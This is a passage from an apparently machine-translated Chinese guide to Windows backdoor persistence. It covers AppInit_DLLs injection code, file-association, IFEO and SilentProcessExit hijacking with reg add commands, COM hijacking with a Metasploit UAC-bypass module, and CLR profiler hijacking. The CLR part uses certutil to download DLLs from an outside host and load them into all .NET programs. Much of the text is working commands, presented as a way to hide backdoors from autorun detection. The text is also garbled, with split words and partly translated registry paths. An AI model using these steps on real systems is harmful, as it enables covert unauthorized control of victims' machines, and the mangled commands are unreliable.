>
> HKEY_CURRENT_USER \\ Software \\ Microsoft \\ Windows \\
> CurrentVersion \\ Expl orer \\ Shell 文件夹
>
> HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows \\
> CurrentVersion \\ E xplorer \\ Shell 文件夹
>
> HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows \\
> CurrentVersion \\ E xplorer \\用户外壳文件夹
####### 浏览器助手对象
本质上是Internet Explorer 启动时加载的DLL 模块
> HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows \\
> CurrentVersion \\ E xplorer \\ Browser Helper 对象
####### AppInit_DLLs
> 注册表中默认存在两个注册表项：AppInitDLLs和LoadAppInitDLLs（win2003
> 没有，但是可以新建），使用\* .dll
> 被加载到进程时，会读取AppInitDLLs注册表项，如果有值，调用LoadLibrary（）api加载用户dll.PS:xp系统会忽略
> LoadAppInitDLLs 注册表项
严格来讲，此DLL 注入不是注入到所有运行进程，而是注入到加载使用\* .dll
文件的进程中
> HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows NT \\
> CurrentVersion
>
> \\ Windows \\ AppInit_DLLs
实现代码：
> HKEY hKey;
>
> DWORD dwDisposition;
>
> const char path\[\] = \"C:\\\\AppInit.dll\"; DWORD dwData = 1;
>
> RegCreateKeyExA(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\\Microsoft\\\\Windows
> NT
>
> \\\\CurrentVersion\\\\Windows\", 0, NULL, 0, KEY_WRITE, NULL, &hKey,
> &dwDispositi on);
>
> RegSetValueExA(hKey, \"AppInit_DLLs\", 0, REG_SZ, (BYTE\*)path, (1 +
> ::lstrlenA(pat h)));
>
> RegSetValueExA(hKey, \"LoadAppInit_DLLs\", 0, REG_DWORD, (BYTE\*)&
> dwData, siz eof(DWORD));
####### 文件关联
文件关联就是指系统把指定扩展名的文件自动关联到相应的应用程序，例如.doc
默认打开方式是Microsoft Word，当用户双击.doc 文件时时就会启动Word
打开该文件。
的Windows
的资源管理器识别文件类型是由扩展名决定的（而并不是文件头决定文件类型）。首先扩展名会对应一种文件类型，这种文件类型的不同操作再对应到不同的具体命令。
比如：
> .txt - \> txtfile - \>
> {"open"："notepad.exe％1"，"编辑"："notepad.exe％1"，\...}文件扩展名与文件类型的对应关系，可以通过ASSOC
> 命令查看或修改
>
> cmd\> assoc .txt
>
> .TXT = txtfile cmd\> ftype txtfile
>
> txtfile =％SystemRoot％\\ system32 \\ NOTEPAD.EXE％1
相关的注册表：
> HKEY_CURRENT_USER \\ Software \\ Classe
> //保存了当前用户的文件关联设置HKEY_LOCAL_MACHINE \\ Software \\ Classe
> //保存了本机上所有用户的设置HKEY_CLASS_ROOT
> //上面两个位置下的键值合并，是为了访问方便而建立的视图HKEY_CURRENT_USER
> \\软件\\微软\\的Windows \\ CurrentVersion \\ Explorer 中\\ File Exts
> \\
>
> //保存了右键选择 "打开方式" 改变默认的关联程序
>
> ＃用户双击文件时查找顺序：
>
> ＃首先检查\... \\\\ FileExts
> \\\\，找不到时查找HKCU，最后才是HKLM。因此检查一个文件是否与某个程序关联可以按照这个顺序检查。
####### 映像劫持（IFEO）
映像劫持（图像文件执行选项）其实是Windows
内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如"探险家。
exe 文件"）发布相应的指令，其中包含有执行程序的路径和
文件名，然后由外壳程序来执行该程序。事实上在该过程中时，Windows
还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的
子键，就查询对应子健中包含的 "dubugger"
键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到"劫持"的虚假程序。
简单点说就是：当你打开的是程序A，而运行的确是程序B. 注册表位置：
> HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows NT \\
> CurrentVersion
>
> \\ Image File Execution Options
比如：
> 1，找到注册表"HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows
> NT \\ CurrentVersion \\ Image File Execution
> Options"目录下的iexplore.exe
>
> 2，添加一个调试程序字符串值（REG_SZ），并且赋值为CALC.EXE 的执行路径
> "C：\\ Windows \\ System32 下\\ CALC.EXE"
>
> 3，运行IEXPLORE.EXE 即可执行CALC.EXE
>
> ＃命令行添加：
>
> #reg add"HKLM \\ HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\
> Windows N T \\ CurrentVersion \\ Image File Execution Options \\
> notepad.exe"/ v debugger / t REG_SZ / d"c：\\ windows \\ system32 \\
> calc.exe"
但是这样设置直接是可以看到的，根据文章[隐蔽后门 -
图像文件执行选项新玩法](https://www.anquanke.com/post/id/151425)了解到可以修改GlobalFlag
的值，达到程序A 静默退出结束后，会执行程序B
的效果，且在注册表看不到具体值，同时自动运行检测不到。
> 首 先 下 载 GFlages.exe 的 安 装 器 DBG 的 安 装 包 ：
> 
> 7C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi
>
> 1，点击：Silent Process Exit
>
> 2，图像处填写需要劫持的软件，比如：Notepad.exe
> 的3，报告模式处勾选启用静默流程退出监控和启动监控流程
>
> 4，Monitor Process 处理需要执行的软件，比如：c：\\ windows \\ system32
> \\ calc.ex
>
> e
>
> 5，应用 - \>确定
>
> 然后打开NOTEPAD.EXE 退出后即可看到的calc.exe，同时NOTEPAD.EXE
> 对应的注册表中的GlobalFlag 无任何值
>
> ＃命令行：
>
> #reg add"HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows NT \\
> Curr entVersion \\ Image File Execution Options \\ notepad.exe"/ v
> GlobalFlag / t REG_D WORD / d 512
>
> #reg add"HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows NT \\
> Curr entVersion \\ Image File Execution Options \\ notepad.exe"/ v
> ReportingMode / t RE G_DWORD / d 1
>
> #reg add"HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows NT \\
> Curr entVersion \\ SilentProcessExit \\ notepad.exe"/ v MonitorProcess
> / t REG_SZ / d "c：\\ windows \\ system32 \\ calc.exe"
在实际的操作当中，在windows2008 及之后的版本，当我们使用shift
等常见后门的时候，替换的二进制文件会受到系统的保护，则我们可以使用镜像劫持技术，
来当成我们的替换目的。
####### COM 劫持
COM（组件对象模型）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。为开发人员提供一个允许开发人员控制和操纵其他应用程序的对象的接口，每个COM
对象都由一个名为CLSID 的唯一ID 定义，大多数COM
类都在操作系统中注册，并由表示注册表中的类标识符
（CLSID）的GUID 标识，也就是说CLSID
就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID
来寻找对象的。
> COM 是组件对象模型（组件对象模型）的缩写
>
> COM 组件由DLL 和EXE 文件形式发布的可执行代码所组成COM 与语言，平台无关
>
> COM 组件对应注册表中CLSID 下的注册表键值
比如：
> 按下Ctrl + R 键打开运行窗口，输入：
>
> :: {20D04FE0-3AEA-1069-A2D8-08002B30309D} - \>我的电脑
>
> :: {645FF040-5081-101B-9F08-00AA002F954E} - \>回收站
使用的ProcessMonitor 可以看到应用程序的寻找过程：
> 1，HKEY_CURRENT_USER \\ Software \\ Classes 下\\ CLSID
> 2，HKEY_CLASSES_ROOT \\ CLSID
>
> 3，HKEY_LOCAL_MACHINE \\ SOFTWARE \\微软\\的Windows \\ CurrentVersion
> \\ Sh ellCompatibility \\对象\\
当进程寻找COM 组件时，首先会寻找：HKCU \\ Software \\ Classes \\ CLSID，
所以直接在CLSID 下新建一个对象ID，就能够劫持某个进程或多个进程。
与DLL 劫持原理相近，但是COM
组件的劫持目标不一定是一个进程，也可以是一个Windows
API，劫持所需的文件不一定是一个DLL，它可以是一个.com 文件，二进制PE
文件，DLL 文件。
MSF 中 自 带 了 利 用 COM 劫 持 的 模 块 ：exploit / windows / local /
bypassuac_comhijack，该模块同时直接可以绕过UAC，具体原理参考：[COM](https://payloads.online/archivers/2018-10-14/1)
劫持
####### CLR
CLR 全称Common Language
Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。无需管理员权限的后门，需要重启或者注销并且重新登录，支持x86
和x64，并能够劫持所有.Net 程序。
> cmd\> SET COR_ENABLE_PROFILING = 1
>
> cmd\> SET COR_PROFILER = {11111111-1111-1111-1111-111111111111}
>
> ＃{11111111-1111-1111-1111-111111111111}表示CLSID
> 可设置为任意数值，只要和系统常用C LSID 不冲突就行
>
> cmd\> certutil.exe -urlcache -split -f 
>
> ＃下载dll
>
> cmd\> certutil.exe -urlcache -split -f  删除
>
> ＃清除下载文件的缓存
>
> cmd\> SET KEY = HKEY_CURRENT_USER \\ Software \\ Classes \\ CLSID \\
> {11111111- 1111-1111-1111-111111111111} \\ InProcServe \*
>
> ＃新建子项{11111111-1111-1111-1111-111111111111} \\ InProcServe \*
>
> cmd\> REG.EXE ADD％KEY％/ V ThreadingModel / T REG_SZ / D Apartment /
> F.
>
> ＃新建REG_SZ 类型键值ThreadingModel：Apartment
>
> cmd\> REG.EXE ADD％KEY％/ VE / T REG_SZ / D"％CD％\\ msg.dll"/ F
>
> ＃修改默认路径值为msg.dll 的路径
>
> cmd\>当前cmd 下启动.net 程序，比如：powershell，即可执行dll
>
> DLL
> 编写参考：HTTPS：//3gstudent.github.io/3gstudent.github.io/Use-Office-to-
> maintain-persistence/
要使CLR
能够劫持系统中全部达网络程序，需要设置环境变量，可以图形化界面操作，也可以使用WMI（通过WMI
修改环境变量需要系统重启或注销重新登录才能生效）。
86 系统
> wmic ENVIRONMENT 创建name ="COR_ENABLE_PROFILING"，username ="％user
> name％"，VariableValue ="1"
>
> wmic ENVIRONMENT 创建name ="COR_PROFILER"，username ="％username
>
> ％"，VariableValue ="{11111111-1111-1111-1111-111111111111}"
>
> certutil.exe -urlcache -split -f
> https://raw.githubusercontent.com/3gstudent/test/ master/msg.dll
>
> certutil.exe -urlcache -split -f
> https://raw.githubusercontent.com/3gstudent/test/ master/msg.dll 删除
>
> SET KEY = HKEY_CURRENT_USER \\ Software \\ Classes \\ CLSID \\
> {11111111-1111-11 11-1111-111111111111} \\ InProcServe \*
>
> REG.EXE ADD％KEY％/ VE / T REG_SZ / D"％CD％\\ msg.dll"/ F REG.EXE
> ADD％KEY％/ V ThreadingModel / T REG_SZ / D Apartment / F.
64 位系统
> wmic ENVIRONMENT 创建name ="COR_ENABLE_PROFILING"，username ="％user
> name％"，VariableValue ="1"
>
> wmic ENVIRONMENT 创建name ="COR_PROFILER"，username ="％username
>
> ％"，VariableValue ="{11111111-1111-1111-1111-111111111111}"
>
> certutil.exe -urlcache -split -f
> https://raw.githubusercontent.com/3gstudent/test/ master/msg.dll
>
> certutil.exe -urlcache -split -f
> https://raw.githubusercontent.com/3gstudent/test/ master/msg.dll 删除
>
> certutil.exe -urlcache -split -f
> https://raw.githubusercontent.com/3gstudent/test/ master/msg_x64.dll
>
> certutil.exe -urlcache -split -f
> https://raw.githubusercontent.com/3gstudent/test/ master/msg_x64.dll
> 删除
>
> SET KEY = HKEY_CURRENT_USER \\ Software \\ Classes \\ CLSID \\
> {11111111-1111-11 11-1111-111111111111} \\ InProcServe \*
>
> REG.EXE ADD％KEY％/ VE / T REG_SZ / D"％CD％\\ msg_x64.dll"/ F REG.EXE
> ADD％KEY％/ V ThreadingModel / T REG_SZ / D Apartment / F.
>
> SET KEY = HKEY_CURRENT_USER \\ Software \\ Classes \\ WoW6432Node \\
> CLSID
>